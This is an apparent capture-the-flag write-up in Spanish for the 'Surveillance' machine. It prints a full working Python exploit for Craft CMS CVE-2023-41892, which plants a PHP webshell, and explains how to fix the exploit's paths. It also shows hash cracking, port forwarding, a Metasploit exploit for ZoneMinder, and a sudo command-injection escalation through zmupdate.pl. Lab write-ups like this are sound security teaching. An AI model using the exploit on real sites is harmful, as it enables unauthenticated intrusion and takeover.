#abusing-sudo #code-review #craft-cms #hashcat #metasploit #pivoting #portfordward #sql #zoneminder
![](../../../Imágenes/Surveillance%201.png)

Surveillance es una máquina que funciona con un sistema operativo Linux y de dificultad media. Para explotar la máquina debemos aprovechar un CVE que nos permite realizar una ejecución remota de código sin autentificación que nos da acceso a la máquina. Posteriormente, debemos hacer un movimiento lateral hacia otro usuario mediante la búsqueda de un par de credenciales que hay en una copia de seguridad. A continuación, debemos realizar otro movimiento lateral aprovechando otro CVE que permite también una ejecución remota de código sin autentificación. Finalmente, para escalar privilegios debemos abusar de un binario con privilegios de administrador.

## Reconocimiento

### Nmap

El escaneo de puertos nos arroja la siguiente información:

![](../../../Imágenes/image-14%201.png)

Utilizando esta información, mi evaluación inicial es:

- Servicio **SSH** en el puerto 22 TCP. Puede ser útil en el futuro si se encuentran credenciales o se pueden generar claves después de obtener un punto de apoyo.
- Servicio **HTTP** alojado en el puerto 80 TCP corriendo bajo Nginx 1.18.0 con un redireccionamiento hacia http://surveillance.htb. Se puede comprobar el sitio web y si no encontramos ninguna vulnerabilidad podemos enumerar subdirectorios y/o subdominios mediante fuerza bruta.

### Website (80 TCP Port)

Añadimos surveillance.htb en el fichero /etc/hosts y accedemos a la dirección mediante el navegador:

![](../../../Imágenes/Screenshot-2024-04-20-at-10-21-23-Surveillance%201.png)

Si nos fijamos en el footer del sitio web podemos ver que el sitio está desarrollado con un gestor de contenidos llamado **Craft CMS**.

También **Wappalyzer** nos muestra la misma información:

![](../../../Imágenes/image-15%202.png)

## Foothold

### Craft CMS Version

Si nos dirigimos al enlace que hay en el footer del sitio web, podemos comprobar la versión de Craft CMS usada en el sitio web. Por lo tanto, ya sabemos que estamos enfrente de la versión 4.4.14:

![](../../../Imágenes/Selection_002-2%201.png)

### Identificar la vulnerabilidad

Investigando por Google podemos ver que existe una vulnerabilidad [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892) relacionada con esta versión de Craft CMS. La vulnerabilidad nos permite ejecución remota de código sin necesidad de autenticación.

![](../../../Imágenes/image-16%202.png)

### Prueba de concepto

Esta vulnerabilidad es fácil de explotar utilizando este [exploit](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce):

```
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://localhost:8080"})

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})    

def shell(cmd):
    response = requests.get(url + "/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```

### Explotación

Copiamos el script en nuestro host de ataque y lo ejecutamos:

![](../../../Imágenes/image-18%202.png)

Parece ser que el script no funciona, ya que este POC depende de la escritura de un webshell, por lo que es necesario encontrar una carpeta adecuada con permisos de escritura. Revisando el código debemos hacer dos pequeños cambios para conseguir que funcione. El cambio es el siguiente:

Por una parte, se deben modificar la siguiente línea, ten en cuenta que esta línea aparece dos veces:

```
response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://localhost:8080"})
```

Por:

```
response = requests.post(url, headers=headers, data=data, files=files)
```

Además, también debemos cambiar la dirección donde se escribirá el script. Si visitamos el repositorio de GitHub vemos que hay una carpeta donde podemos probar a depositar el webshell.

![](../../../Imágenes/image-20%201.png)

Esta modificación se da en dos lugares:

```
<write filename="info:DOCUMENTROOT/shell.php" />
```

```
response = requests.get(url + "/shell.php", params={"cmd": cmd})
```

Y se debe reemplazar por esto:

```
<write filename="info:DOCUMENTROOT/cpresources/shell.php" />
```

```
response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
```

Probemos a ejecutar el script ahora:

![](../../../Imágenes/image-19%201.png)

Ahora es momento de estabilizar la terminal:

![](../../../Imágenes/image-22%201.png)

## Movimiento lateral hacia Matthew

En este momento estamos con un punto de apoyo como usuario www-data. Vemos que hay dos usuarios en el sistema, Matthew y Zoneminder:

![[../../../Imágenes/Pasted image 20240919130039.png]]

Enumerando el sistema nos encontramos con una copia de seguridad de la base de datos SQL del sitio web:

![[../../../Imágenes/Pasted image 20240919130050.png]]

En este momento, copiemos el fichero al host de ataque y lo descomprimimos. Una vez hecho esto, abrimos la copia de seguridad con un editor de texto en busca de credenciales.

Por suerte, encontramos un hash del usuario Matthew.

![](../../../Imágenes/image-25%201.png)

Ahora intentemos desencriptarlo usando **hashcat**:

![](../../../Imágenes/image-26%201.png)

![](../../../Imágenes/image-27%201.png)

Hacemos suerte y logramos encontrar la contraseña del usuario Matthew que nos permite conectarnos a la máquina con este usuario mediante SSH y realizar el movimiento lateral:

![[../../../Imágenes/Pasted image 20240919135441.png]]

Aprovechamos para leer la bandera user.txt:

![](../../../Imágenes/image-29%201.png)

## Movimiento lateral hacia Zoneminder

Enumerando el sistema nos encontramos con unas credenciales del usuario Zoneminder en el fichero database.php que sirven para conectarse a una base de datos MySQL:

![](../../../Imágenes/image-31%201.png)

![](../../../Imágenes/Selection_020-1%201.png)

También observamos el funcionamiento de un servicio en el puerto 8080, por lo tanto, nos disponemos a hacer un portfordward de ese puerto mediante SSH:

![](../../../Imágenes/image-30%201.png)

![](../../../Imágenes/image-33%201.png)

De esta forma podemos navegar hacia ese puerto mediante el navegador de nuestro host de ataque:

![](../../../Imágenes/image-34%201.png)

El sitio web parece funcionar una aplicación llamada Zoneminder. Después de investigar un poco descubrimos que Zoneminder es un software que se utiliza para monitorear.

En este punto es interesante probar varias credenciales por defecto, aunque no llegamos a tener suerte.

### Identificar la versión

Antes debemos encontrar la versión que trabaje:

![](../../../Imágenes/image-35%201.png)

### Identificar la vulnerabilidad

Decidimos investigar por Google en la búsqueda de alguna vulnerabilidad del servicio y nos encontramos en que existe la vulnerabilidad [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035). Esta vulnerabilidad permite la ejecución remota de código sin necesidad de autenticación.

![](../../../Imágenes/image-36%201.png)

### Explotación

Aunque existen varias pruebas de concepto para explotar la vulnerabilidad, decidimos usar un módulo de **metasploit**:

![](../../../Imágenes/image-37%201.png)

Realizamos la configuración del módulo y procedemos a ejecutarlo para al fin llegar hacia el usuario Zoneminder:

![](../../../Imágenes/image-38%201.png)

## Escalada de privilegios

Una vez dentro del sistema objetivo como usuario Zoneminder descubrimos que este puede ejecutar con privilegios el siguiente comando que ejecuta diferentes binarios desarrollados con Perl:

![](../../../Imágenes/image-39%201.png)

El binario ejecuta todos los binarios ubicados en /usr/bin:

![](../../../Imágenes/image-40%201.png)

Después de revisar todos estos binarios nos parece interesante el binario zmupdate.pl. Viendo su ayuda, podemos intentar abusar de él:

![](../../../Imágenes/image-41%201.png)

Mirando el script, vemos que el siguiente código escapa la inyección cuando se introduce en la contraseña, en cambio, no en los otros parámetros:

```
my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
      if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
          $command .= ' -S'.$portOrSocket;
        } else {
          $command .= ' -h'.$host.' -P'.$portOrSocket;
        }
      } else {
        $command .= ' -h'.$host;
      }
      my $backup = '/tmp/zm/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
      print("Creating backup to $backup. This may take several minutes.\n");
      ($command) = $command =~ /(.*)/; ## detaint
```

Como hemos visto en la ayuda, podemos manipular los otros parámetros, por lo tanto:

![](../../../Imágenes/image-43%201.png)

Con esto conseguimos una terminal con privilegios. Aunque por el momento la terminal no termina siendo funcional y debemos realizar otro forma de escalar los privilegios.

Podemos probar a crear una copia del binario /bin/bash en el directorio /tmp y luego ejecutarlo:

![](../../../Imágenes/image-44%201.png)

Comprobemos que se ha creado el binario:

![](../../../Imágenes/image-45%201.png)

Probemos a ejecutarlo y comprobar que hemos escalado los privilegios:

![](../../../Imágenes/image-46%201.png)

Por último, solo queda leer la bandera root.txt y dar por finalizada la máquina:

![](../../../Imágenes/image-13%201.png)
